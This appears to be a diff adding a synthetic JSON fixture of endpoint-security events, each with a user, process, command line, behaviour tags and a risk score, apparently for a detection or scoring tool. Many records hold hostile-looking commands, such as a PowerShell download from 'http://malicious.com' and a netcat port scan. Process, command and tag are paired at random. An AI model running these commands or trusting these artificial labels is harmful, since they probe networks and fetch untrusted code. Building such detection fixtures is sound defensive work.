+    "exe": "powershell.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "6313",
+    "ppid": "211",
+    "tags": [
+      "cloud_console",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.92,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "cloud_console",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "1fe2353d-65ab-4354-9108-56a90f038be4",
+    "timestamp": "2025-06-09T13:54:18.021567Z",
+    "user": "bob",
+    "exe": "python.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "9348",
+    "ppid": "157",
+    "tags": [
+      "hidden_window",
+      "doc_opened"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.71,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window",
+      "doc_opened"
+    ]
+  },
+  {
+    "event_id": "2a3eb494-29b9-46ef-a979-05167ffba358",
+    "timestamp": "2025-06-09T03:30:18.021609Z",
+    "user": "admin",
+    "exe": "/bin/bash",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "2133",
+    "ppid": "321",
+    "tags": [
+      "doc_opened",
+      "nmap",
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.37,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "nmap",
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "9a29b628-f19c-4fda-8dad-923e536894aa",
+    "timestamp": "2025-06-09T11:55:18.021659Z",
+    "user": "bob",
+    "exe": "powershell.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "9724",
+    "ppid": "641",
+    "tags": [
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.81,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "a0551a5b-e234-401d-83a9-9501b6d5a111",
+    "timestamp": "2025-06-09T17:07:18.021701Z",
+    "user": "alice",
+    "exe": "/bin/bash",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "6755",
+    "ppid": "750",
+    "tags": [
+      "doc_opened",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.62,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "b1bbdddb-3d04-49d8-8a05-535a77317ab9",
+    "timestamp": "2025-06-09T20:47:18.021752Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "3110",
+    "ppid": "288",
+    "tags": [
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.38,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "a9edb19d-3a5c-48e4-913e-34ba86bddea3",
+    "timestamp": "2025-06-09T09:21:18.021795Z",
+    "user": "bob",
+    "exe": "python.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "9154",
+    "ppid": "161",
+    "tags": [
+      "internal_port_scan",
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.57,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "893d1dd6-d54d-4f56-93d3-28b5dc5e06c2",
+    "timestamp": "2025-06-09T22:36:18.021839Z",
+    "user": "bob",
+    "exe": "/bin/bash",
+    "cmdline": "svchost.exe /service",
+    "pid": "5833",
+    "ppid": "488",
+    "tags": [
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.86,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "88792805-2597-4314-8a66-04729f40a3b9",
+    "timestamp": "2025-06-09T06:09:18.021868Z",
+    "user": "bob",
+    "exe": "python.exe",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "8545",
+    "ppid": "633",
+    "tags": [
+      "doc_opened",
+      "cloud_console",
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.82,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "cloud_console",
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "bda72855-01b5-4386-b901-3410eda73ab1",
+    "timestamp": "2025-06-09T11:31:18.021917Z",
+    "user": "charlie",
+    "exe": "powershell.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "9715",
+    "ppid": "559",
+    "tags": [
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.89,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "bebb8da6-b510-45b4-9fb6-0aaf1ae7140a",
+    "timestamp": "2025-06-09T03:18:18.021960Z",
+    "user": "bob",
+    "exe": "/bin/bash",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "5247",
+    "ppid": "912",
+    "tags": [
+      "hidden_window",
+      "doc_opened"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.89,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window",
+      "doc_opened"
+    ]
+  },
+  {
+    "event_id": "e9b11c7f-6178-49f8-b2f3-e65cb2b334a6",
+    "timestamp": "2025-06-09T06:05:18.022010Z",
+    "user": "admin",
+    "exe": "powershell.exe",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "9538",
+    "ppid": "556",
+    "tags": [
+      "hostname_enum",
+      "cloud_console",
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.31,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum",
+      "cloud_console",
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "7b66fb53-af5b-4443-abbb-7df6279f8cd8",
+    "timestamp": "2025-06-09T19:59:18.022055Z",
+    "user": "admin",
+    "exe": "/bin/bash",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "3056",
+    "ppid": "218",
+    "tags": [
+      "spread_path",
+      "script_exec",
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.82,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "spread_path",
+      "script_exec",
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "99d9c69e-4314-41f2-9139-7c2fa8721ad0",
+    "timestamp": "2025-06-09T17:07:18.022107Z",
+    "user": "alice",
+    "exe": "/bin/bash",
+    "cmdline": "svchost.exe /service",
+    "pid": "5705",
+    "ppid": "573",
+    "tags": [
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.69,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "8e6d25c7-6031-4654-9d68-7f4def32e9b0",
+    "timestamp": "2025-06-09T10:58:18.022150Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "4233",
+    "ppid": "678",
+    "tags": [
+      "nmap",
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.34,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "d6afc84f-36b5-4d6b-a0f1-101863793478",
+    "timestamp": "2025-06-09T15:35:18.022193Z",
+    "user": "alice",
+    "exe": "/usr/bin/nc",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "2871",
+    "ppid": "379",
+    "tags": [
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.77,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "ffc2a52e-b6a6-481b-9415-3fddb57cf80d",
+    "timestamp": "2025-06-09T11:33:18.022236Z",
+    "user": "charlie",
+    "exe": "python.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "8561",
+    "ppid": "701",
+    "tags": [
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.91,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "43144c9c-3ec8-4835-a98b-7f517cc6ff27",
+    "timestamp": "2025-06-09T05:31:18.022280Z",
+    "user": "admin",
+    "exe": "python.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "9056",
+    "ppid": "970",
+    "tags": [
+      "cloud_console",
+      "doc_opened"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.75,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "cloud_console",
+      "doc_opened"
+    ]
+  },
+  {
+    "event_id": "c5a2000f-3b8a-429e-a504-f459f85b94e2",
+    "timestamp": "2025-06-09T08:06:18.022323Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "7725",
+    "ppid": "266",
+    "tags": [
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.82,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "afd90525-a9ea-4ae3-95b7-1a5740cd9d6a",
+    "timestamp": "2025-06-09T04:45:18.022376Z",
+    "user": "alice",
+    "exe": "powershell.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "5081",
+    "ppid": "794",
+    "tags": [
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.58,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "32433987-f823-4edb-bf4e-bdc4c8132c7b",
+    "timestamp": "2025-06-09T07:07:18.022417Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "5395",
+    "ppid": "883",
+    "tags": [
+      "auth_attempt",
+      "script_exec",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.43,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt",
+      "script_exec",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "104f8556-1f39-46f5-8feb-7d7fd4b8e93d",
+    "timestamp": "2025-06-09T22:07:18.022461Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "7834",
+    "ppid": "793",
+    "tags": [
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.57,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "74b298db-0735-45a6-b1ca-2f0c771960ae",
+    "timestamp": "2025-06-09T21:16:18.022504Z",
+    "user": "charlie",
+    "exe": "/bin/bash",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "2343",
+    "ppid": "232",
+    "tags": [
+      "internal_port_scan",
+      "auth_attempt",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.85,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "auth_attempt",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "b3991084-ef9c-4b2e-beca-418aaa935852",
+    "timestamp": "2025-06-10T01:06:18.022562Z",
+    "user": "charlie",
+    "exe": "svchost.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "5028",
+    "ppid": "326",
+    "tags": [
+      "nmap",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.92,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "73f1cce3-299d-476a-86f6-31f654582d1a",
+    "timestamp": "2025-06-09T11:04:18.022605Z",
+    "user": "charlie",
+    "exe": "/usr/bin/nc",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "6551",
+    "ppid": "360",
+    "tags": [
+      "internal_port_scan",
+      "auth_attempt",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.57,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "auth_attempt",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "3928d09c-e70f-41ee-b046-d70935c2340f",
+    "timestamp": "2025-06-09T13:08:18.022653Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "4787",
+    "ppid": "864",
+    "tags": [
+      "internal_port_scan",
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.47,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "1b05df0c-e7c5-4595-a745-8cbf1ee99bc0",
+    "timestamp": "2025-06-09T09:42:18.022699Z",
+    "user": "charlie",
+    "exe": "python.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "5334",
+    "ppid": "476",
+    "tags": [
+      "internal_port_scan",
+      "doc_opened"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.61,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "doc_opened"
+    ]
+  },
+  {
+    "event_id": "08cbb702-76cf-4603-9a7e-5b6b33bc519d",
+    "timestamp": "2025-06-10T00:39:18.022741Z",
+    "user": "alice",
+    "exe": "svchost.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "4066",
+    "ppid": "969",
+    "tags": [
+      "auth_attempt",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.34,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "ae947d8a-9f3e-4c2d-9650-82712091d7c5",
+    "timestamp": "2025-06-09T07:14:18.022785Z",
+    "user": "admin",
+    "exe": "powershell.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "7679",
+    "ppid": "497",
+    "tags": [
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.85,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "e3c59c8e-1726-4f90-8b18-844eb4c3b21d",
+    "timestamp": "2025-06-09T16:21:18.022828Z",
+    "user": "bob",
+    "exe": "python.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "5249",
+    "ppid": "620",
+    "tags": [
+      "doc_opened",
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.83,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "2e87fc31-86d5-4d26-8de9-8867f5865466",
+    "timestamp": "2025-06-09T06:47:18.022871Z",
+    "user": "alice",
+    "exe": "svchost.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "9216",
+    "ppid": "448",
+    "tags": [
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.59,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "c2afb6a4-e0e4-48fd-8558-25d7416c7ac9",
+    "timestamp": "2025-06-09T09:43:18.022913Z",
+    "user": "bob",
+    "exe": "/bin/bash",
+    "cmdline": "svchost.exe /service",
+    "pid": "4312",
+    "ppid": "998",
+    "tags": [
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.33,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "af9403fd-31a3-4333-a3c9-8c84d6ad6091",
+    "timestamp": "2025-06-09T18:20:18.022955Z",
+    "user": "charlie",
+    "exe": "/usr/bin/nc",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "5551",
+    "ppid": "953",
+    "tags": [
+      "script_exec",
+      "spread_path",
+      "doc_opened"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.84,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "spread_path",
+      "doc_opened"
+    ]
+  },
+  {
+    "event_id": "6791259c-ad4e-4091-8f9d-926df2f6c914",
+    "timestamp": "2025-06-09T03:35:18.022999Z",
+    "user": "charlie",
+    "exe": "powershell.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "8416",
+    "ppid": "392",
+    "tags": [
+      "script_exec",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.62,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "32e9d08f-647e-455c-b887-4c9b3f1d1c71",
+    "timestamp": "2025-06-09T07:12:18.023042Z",
+    "user": "admin",
+    "exe": "python.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "2260",
+    "ppid": "806",
+    "tags": [
+      "doc_opened",
+      "internal_port_scan",
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.78,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "internal_port_scan",
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "46456655-26ef-4df7-adce-281b710e919d",
+    "timestamp": "2025-06-09T13:42:18.023091Z",
+    "user": "alice",
+    "exe": "svchost.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "6219",
+    "ppid": "830",
+    "tags": [
+      "suspicious_clipboard_usage",
+      "hidden_window",
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.91,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "suspicious_clipboard_usage",
+      "hidden_window",
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "6b98cc41-ab28-4c33-904c-fe4155deaa77",
+    "timestamp": "2025-06-10T01:40:18.023132Z",
+    "user": "alice",
+    "exe": "/bin/bash",
+    "cmdline": "svchost.exe /service",
+    "pid": "9241",
+    "ppid": "303",
+    "tags": [
+      "doc_opened",
+      "suspicious_clipboard_usage",
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.33,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "suspicious_clipboard_usage",
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "a8ef6ccb-0dd6-4d1b-b667-2466d8481e8d",
+    "timestamp": "2025-06-09T16:29:18.023175Z",
+    "user": "charlie",
+    "exe": "powershell.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "7812",
+    "ppid": "985",
+    "tags": [
+      "auth_attempt",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.89,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "32738b50-d99d-4704-ac71-884e8175a8ef",
+    "timestamp": "2025-06-09T11:43:18.023215Z",
+    "user": "bob",
+    "exe": "powershell.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "3964",
+    "ppid": "489",
+    "tags": [
+      "auth_attempt",
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.63,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt",
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "f3e8263d-1d1c-4327-a214-cd20456c53e8",
+    "timestamp": "2025-06-09T14:25:18.023256Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "9247",
+    "ppid": "182",
+    "tags": [
+      "nmap",
+      "hostname_enum",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.49,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "hostname_enum",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "417fa322-bf1e-489a-a786-694ade746d52",
+    "timestamp": "2025-06-10T01:44:18.023307Z",
+    "user": "bob",
+    "exe": "python.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "1640",
+    "ppid": "707",
+    "tags": [
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.39,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "b9bfa014-33ce-4fa6-9392-58ef768516e1",
+    "timestamp": "2025-06-09T17:41:18.023350Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "5572",
+    "ppid": "933",
+    "tags": [
+      "hostname_enum",
+      "suspicious_clipboard_usage",
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.49,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum",
+      "suspicious_clipboard_usage",
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "9c65ff65-7305-47fa-9db8-c0a69b47504c",
+    "timestamp": "2025-06-09T23:08:18.023392Z",
+    "user": "admin",
+    "exe": "python.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "2162",
+    "ppid": "985",
+    "tags": [
+      "internal_port_scan",
+      "auth_attempt",
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.92,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "auth_attempt",
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "334b30c8-24b3-4439-a58b-5e710e9696fd",
+    "timestamp": "2025-06-10T02:11:18.023440Z",
+    "user": "alice",
+    "exe": "/bin/bash",
+    "cmdline": "svchost.exe /service",
+    "pid": "2965",
+    "ppid": "941",
+    "tags": [
+      "auth_attempt",
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.5,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt",
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "1897aea9-066f-4785-a7dc-5c7767429ed5",
+    "timestamp": "2025-06-09T20:13:18.023489Z",
+    "user": "charlie",
+    "exe": "/bin/bash",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "8437",
+    "ppid": "397",
+    "tags": [
+      "spread_path",
+      "hostname_enum",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.6,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "spread_path",
+      "hostname_enum",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "47efdd1a-5ce5-4bc0-bbe8-93cc1cc307cf",
+    "timestamp": "2025-06-10T00:33:18.023533Z",
+    "user": "admin",
+    "exe": "/bin/bash",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "8868",
+    "ppid": "845",
+    "tags": [
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.62,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "45bcffbe-99b8-46be-b66d-9842cdfd1293",
+    "timestamp": "2025-06-09T14:23:18.023573Z",
+    "user": "bob",
+    "exe": "svchost.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "4068",
+    "ppid": "379",
+    "tags": [
+      "nmap",
+      "auth_attempt",
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.92,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "auth_attempt",
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "3aa71dc5-5957-4c95-865c-631748eb66fa",
+    "timestamp": "2025-06-09T17:02:18.023615Z",
+    "user": "admin",
+    "exe": "powershell.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "3315",
+    "ppid": "588",
+    "tags": [
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.87,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "3ae5612c-9b68-4a9c-a5e4-fa781e7d3670",
+    "timestamp": "2025-06-09T15:46:18.023658Z",
+    "user": "alice",
+    "exe": "python.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "3241",
+    "ppid": "366",
+    "tags": [
+      "nmap",
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.52,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "3880148f-99b9-445d-a8c6-c99f66af58a9",
+    "timestamp": "2025-06-09T07:31:18.023710Z",
+    "user": "bob",
+    "exe": "svchost.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "4094",
+    "ppid": "869",
+    "tags": [
+      "auth_attempt",
+      "spread_path",
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.81,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt",
+      "spread_path",
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "07a19ecd-302f-4175-8a9c-a5df743b829f",
+    "timestamp": "2025-06-09T23:40:18.023753Z",
+    "user": "bob",
+    "exe": "powershell.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "7069",
+    "ppid": "375",
+    "tags": [
+      "spread_path",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.91,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "spread_path",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "6f111ba7-5a0d-4c65-b78c-350ac947de51",
+    "timestamp": "2025-06-10T02:02:18.023793Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "8391",
+    "ppid": "375",
+    "tags": [
+      "spread_path",
+      "cloud_console",
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.83,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "spread_path",
+      "cloud_console",
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "a2e2480f-fbe7-4484-813f-b37836e46748",
+    "timestamp": "2025-06-09T17:58:18.023844Z",
+    "user": "admin",
+    "exe": "python.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "8531",
+    "ppid": "653",
+    "tags": [
+      "doc_opened",
+      "spread_path",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.38,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "spread_path",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "7b12b588-c938-4539-a3f2-97a87e5365b1",
+    "timestamp": "2025-06-09T11:56:18.023888Z",
+    "user": "admin",
+    "exe": "/usr/bin/nc",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "4880",
+    "ppid": "613",
+    "tags": [
+      "nmap",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.8,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "b4bc7a06-ac78-44ff-a684-e33ca73385eb",
+    "timestamp": "2025-06-09T22:23:18.023930Z",
+    "user": "charlie",
+    "exe": "/bin/bash",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "1378",
+    "ppid": "982",
+    "tags": [
+      "script_exec",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.92,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "79e072df-9332-4f75-998f-c577a808756d",
+    "timestamp": "2025-06-10T02:12:18.023972Z",
+    "user": "bob",
+    "exe": "python.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "7782",
+    "ppid": "728",
+    "tags": [
+      "doc_opened"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.34,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened"
+    ]
